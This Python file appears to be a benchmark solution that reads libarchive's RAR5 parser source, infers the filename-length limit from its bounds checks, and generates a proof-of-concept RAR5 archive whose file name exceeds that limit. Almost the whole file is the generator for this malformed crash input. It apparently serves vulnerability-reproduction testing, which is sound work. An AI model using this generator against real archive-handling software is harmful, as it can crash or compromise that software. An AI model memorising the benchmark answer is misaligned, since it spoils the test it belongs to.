import os
import re
import tarfile
import zlib
from typing import Dict, Iterator, List, Optional, Tuple


def _iter_source_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                path = os.path.join(root, fn)
                rel = os.path.relpath(path, src_path).replace(os.sep, "/")
                try:
                    with open(path, "rb") as f:
                        yield rel, f.read()
                except Exception:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                yield name, data
    except Exception:
        # Fallback: treat as plain file
        try:
            with open(src_path, "rb") as f:
                yield os.path.basename(src_path), f.read()
        except Exception:
            return


_C_SUFFIX_RE = re.compile(r'(?P<num>(?:0x[0-9a-fA-F]+|\d+))(?P<suf>[uUlL]+)\b')


def _sanitize_c_int_expr(expr: str) -> str:
    expr = expr.strip()
    expr = expr.split("//", 1)[0].strip()
    expr = expr.split("/*", 1)[0].strip()
    expr = _C_SUFFIX_RE.sub(lambda m: m.group("num"), expr)
    # Remove casts like (size_t)
    expr = re.sub(r'\(\s*[A-Za-z_][A-Za-z0-9_ \t\*]*\s*\)', '', expr)
    expr = expr.replace("~", " ^ -1 ")
    return expr


def _safe_eval_int(expr: str, symbols: Dict[str, int]) -> Optional[int]:
    expr = _sanitize_c_int_expr(expr)
    if not expr:
        return None
    # Replace identifiers
    def repl(m):
        name = m.group(0)
        if name in symbols:
            return str(symbols[name])
        return name

    expr = re.sub(r'\b[A-Za-z_][A-Za-z0-9_]*\b', repl, expr)

    if re.search(r'[^0-9xXa-fA-F\(\)\|\&\^\+\-\*\/\<\>\s]', expr):
        return None
    try:
        v = eval(expr, {"__builtins__": {}}, {})
        if isinstance(v, bool):
            return int(v)
        if isinstance(v, int):
            return v
        return None
    except Exception:
        return None


def _parse_defines(text: str) -> Dict[str, str]:
    defines: Dict[str, str] = {}
    for line in text.splitlines():
        if not line.startswith("#define"):
            continue
        parts = line.split(None, 2)
        if len(parts) < 3:
            continue
        name = parts[1].strip()
        val = parts[2].strip()
        if "(" in name:
            continue  # function-like macro
        defines[name] = val
    return defines


def _resolve_macros(defmaps: List[Dict[str, str]]) -> Dict[str, int]:
    raw: Dict[str, str] = {}
    for dm in defmaps:
        raw.update(dm)

    resolved: Dict[str, int] = {}

    def resolve(name: str, stack: set) -> Optional[int]:
        if name in resolved:
            return resolved[name]
        if name in stack:
            return None
        if name not in raw:
            return None
        stack.add(name)
        expr = raw[name]
        # Replace identifiers with resolved values where possible
        ids = set(re.findall(r'\b[A-Za-z_][A-Za-z0-9_]*\b', expr))
        symvals: Dict[str, int] = {}
        for ident in ids:
            if ident == name:
                continue
            v = resolve(ident, stack)
            if v is not None:
                symvals[ident] = v
        # also allow already resolved dict
        symvals.update(resolved)
        v = _safe_eval_int(expr, symvals)
        stack.remove(name)
        if v is None:
            return None
        resolved[name] = int(v)
        return resolved[name]

    # attempt resolve all
    for k in list(raw.keys()):
        resolve(k, set())
    return resolved


def _infer_rar5_size_includes_self(rar5_c: str) -> bool:
    # Heuristics from comments
    if re.search(r'head(?:er)?\s*size[^.\n]{0,80}\bincluding\b', rar5_c, flags=re.IGNORECASE):
        return True
    if re.search(r'head(?:er)?\s*size[^.\n]{0,80}\bexcluding\b', rar5_c, flags=re.IGNORECASE):
        return False

    # Look for patterns indicating subtraction of size-field bytes from header_size
    if re.search(r'\b(?:hdr|header)\w*size\w*\s*-\s*\w*(?:bytes|vint|var|consum|len)\w*', rar5_c, flags=re.IGNORECASE):
        return True
    if re.search(r'\b(?:hdr|header)\w*size\w*\s*-\=\s*\w+', rar5_c, flags=re.IGNORECASE):
        return True

    # If there is a read_ahead of (header_size - something), likely includes itself.
    if re.search(r'read_ahead\s*\([^)]*(?:hdr|header)\w*size\w*\s*-\s*', rar5_c, flags=re.IGNORECASE):
        return True

    # If common pattern read_ahead(header_size) exists, could be either; default to True per RAR5 spec.
    return True


def _infer_name_max(rar5_c: str, macro_vals: Dict[str, int]) -> int:
    candidates: List[Tuple[int, int]] = []  # (score, value)
    lines = rar5_c.splitlines()
    for i, line in enumerate(lines):
        if "name" not in line.lower():
            continue
        if ">" not in line and ">=" not in line:
            continue
        if "size" not in line.lower() and "len" not in line.lower() and "length" not in line.lower():
            continue
        m = re.search(r'\bif\s*\([^)]*\bname[A-Za-z0-9_]*\b[^)]*(?:>=|>)\s*([A-Za-z_][A-Za-z0-9_]*|0x[0-9A-Fa-f]+|\d+)', line)
        if not m:
            continue
        tok = m.group(1)
        val: Optional[int] = None
        if re.fullmatch(r'0x[0-9A-Fa-f]+|\d+', tok):
            try:
                val = int(tok, 0)
            except Exception:
                val = None
        else:
            val = macro_vals.get(tok)
        if val is None:
            continue
        if val <= 0:
            continue

        ctx = " ".join(lines[max(0, i - 2):min(len(lines), i + 3)]).lower()
        score = 0
        if "max" in ctx or "maximum" in ctx or "limit" in ctx:
            score += 4
        if "name" in tok.lower() or "path" in tok.lower() or "file" in tok.lower():
            score += 3
        if 64 <= val <= 65536:
            score += 3
        if val < 16 or val > (1 << 24):
            score -= 5
        # Prefer values close to 1024 (common pathname limit in code)
        score -= min(10, abs(val - 1024) // 256)
        candidates.append((score, int(val)))

    if candidates:
        candidates.sort(key=lambda x: (x[0], -x[1]), reverse=True)
        return candidates[0][1]

    # Fallback: look for NAME_MAX-like macros in macro_vals
    macro_candidates = []
    for k, v in macro_vals.items():
        kl = k.lower()
        if "name" in kl and ("max" in kl or "limit" in kl) and 64 <= v <= 65536:
            macro_candidates.append((abs(v - 1024), v))
    if macro_candidates:
        macro_candidates.sort()
        return macro_candidates[0][1]

    return 1024


def _encode_vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint cannot encode negative")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _le32(n: int) -> bytes:
    return int(n & 0xFFFFFFFF).to_bytes(4, "little")


def _build_rar5_block(block_type: int, head_flags: int, body: bytes, data_size: Optional[int], size_includes_self: bool) -> bytes:
    rest = bytearray()
    rest += _encode_vint(block_type)
    rest += _encode_vint(head_flags)
    if head_flags & 0x01:
        # Extra area present: none for our blocks
        rest += _encode_vint(0)
    if head_flags & 0x02:
        if data_size is None:
            data_size = 0
        rest += _encode_vint(int(data_size))
    rest += body
    if head_flags & 0x01:
        # extra area bytes, none
        pass

    if size_includes_self:
        # header_size counts bytes starting at itself (the VInt bytes) up to end of header (excluding CRC32)
        size = len(rest) + 1
        while True:
            size_v = _encode_vint(size)
            size2 = len(rest) + len(size_v)
            if size2 == size:
                header_bytes = size_v + bytes(rest)
                break
            size = size2
        crc = zlib.crc32(header_bytes) & 0xFFFFFFFF
        return _le32(crc) + header_bytes
    else:
        # header_size counts bytes after itself (starting at block_type), excluding CRC and size field
        size_v = _encode_vint(len(rest))
        crc = zlib.crc32(bytes(rest)) & 0xFFFFFFFF
        return _le32(crc) + size_v + bytes(rest)


def _build_poc(name_len: int, size_includes_self: bool) -> bytes:
    sig = b"Rar!\x1a\x07\x01\x00"

    # Main header block: type=1, head_flags=0, body: archive_flags=0
    main_body = _encode_vint(0)
    main_blk = _build_rar5_block(1, 0, main_body, None, size_includes_self)

    # File header block: type=2, head_flags=data present, data_size=0
    # File body (per common RAR5 layout in libarchive/spec):
    # file_flags(VInt)=0, unpacked_size(VInt)=0, attributes(VInt)=0, comp_info(VInt)=0, host_os(VInt)=0, name_size(VInt), name bytes
    file_name = b"A" * int(name_len)
    file_body = b"".join([
        _encode_vint(0),          # file_flags
        _encode_vint(0),          # unpacked size
        _encode_vint(0),          # attributes
        _encode_vint(0),          # comp_info
        _encode_vint(0),          # host_os
        _encode_vint(len(file_name)),
        file_name
    ])
    file_blk = _build_rar5_block(2, 0x02, file_body, 0, size_includes_self)

    return sig + main_blk + file_blk


class Solution:
    def solve(self, src_path: str) -> bytes:
        rar5_candidates: List[Tuple[str, str]] = []
        define_maps: List[Dict[str, str]] = []
        for name, data in _iter_source_files(src_path):
            lname = name.lower()
            if not (lname.endswith(".c") or lname.endswith(".h")):
                continue
            if "rar5" not in lname and "rar" not in lname:
                continue
            try:
                txt = data.decode("utf-8", errors="ignore")
            except Exception:
                continue
            if lname.endswith(".h"):
                define_maps.append(_parse_defines(txt))
            elif "rar5" in lname and lname.endswith(".c"):
                if "support_format_rar5" in lname or "rar5" in lname:
                    rar5_candidates.append((name, txt))
                define_maps.append(_parse_defines(txt))

        if not rar5_candidates:
            # fallback: scan all .c for "rar5"
            for name, data in _iter_source_files(src_path):
                lname = name.lower()
                if not lname.endswith(".c"):
                    continue
                if "rar5" not in lname:
                    continue
                txt = data.decode("utf-8", errors="ignore")
                rar5_candidates.append((name, txt))
                define_maps.append(_parse_defines(txt))
                break

        rar5_c = rar5_candidates[0][1] if rar5_candidates else ""
        for n, t in rar5_candidates:
            if "archive_read_support_format_rar5.c" in n.lower():
                rar5_c = t
                break

        macro_vals = _resolve_macros(define_maps)

        size_includes_self = _infer_rar5_size_includes_self(rar5_c) if rar5_c else True
        name_max = _infer_name_max(rar5_c, macro_vals) if rar5_c else 1024
        if name_max < 1:
            name_max = 1024

        name_len = int(name_max) + 1
        # Keep within reasonable bounds in case of weird parsing; still must exceed max
        if name_len > (1 << 20):
            name_len = 1024 + 1

        return _build_poc(name_len, size_includes_self)